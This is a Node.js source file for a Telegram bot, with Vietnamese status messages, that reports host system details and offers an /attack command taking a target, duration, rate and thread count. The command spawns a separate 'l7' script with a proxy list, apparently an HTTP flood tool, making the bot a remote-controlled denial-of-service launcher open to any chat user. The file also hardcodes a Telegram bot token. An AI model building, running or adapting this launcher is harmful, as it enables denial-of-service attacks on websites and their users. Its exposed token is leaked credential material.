const TelegramBot = require('node-telegram-bot-api')
const { spawn } = require('child_process')
const express = require('express')
const si = require('systeminformation')

const TOKEN = '7937745403:AAGBsPZIbCTzvhYhsOFkL-IVAQc3m-ta-Dc'
const bot = new TelegramBot(TOKEN, { polling: true })

const app = express()
const PORT = process.env.PORT || 3000

app.get('/', (req, res) => res.send('Bot hoạt động'))
app.listen(PORT, () => console.log(`Cổng ${PORT}`))

bot.onText(/\/system/, async (msg) => {
  const chatId = msg.chat.id
  try {
    const cpu = await si.cpu()
    const mem = await si.mem()
    const disk = await si.fsSize()
    const os = await si.osInfo()
    const systemInfo = {
      OS: `${os.distro} ${os.release} (${os.arch})`,
      CPU: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
      RAM: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
      Disk: `${disk[0].fs} ${(disk[0].size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(disk[0].used / 1024 / 1024 / 1024).toFixed(2)} GB used`
    }
    bot.sendMessage(chatId, '```json\n' + JSON.stringify(systemInfo, null, 2) + '\n```', { parse_mode: 'Markdown' })
  } catch (err) {
    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  }
})

bot.on('message', (msg) => {
  const id = msg.chat.id
  const text = msg.text?.trim()
  if (!text) return

  if (text.startsWith('/attack')) {
    const args = text.split(/\s+/).slice(1)
    if (args.length !== 4) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/attack [target] [time] [rate] [thread]" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }

    const [target, time, rate, thread] = args
    if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Invalid args" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      return
    }

    try {
      const cmd = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt'])
      bot.sendMessage(id, '```json\n' + JSON.stringify({ status: "Running", target, time, rate, thread }, null, 2) + '\n```', { parse_mode: 'Markdown' })

      cmd.on('error', err => {
        bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      })

      cmd.on('close', code => {
        bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code }, null, 2) + '\n```', { parse_mode: 'Markdown' })
      })
    } catch (err) {
      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
    }

    return
  }
})

bot.on('polling_error', err => console.error(err.message))
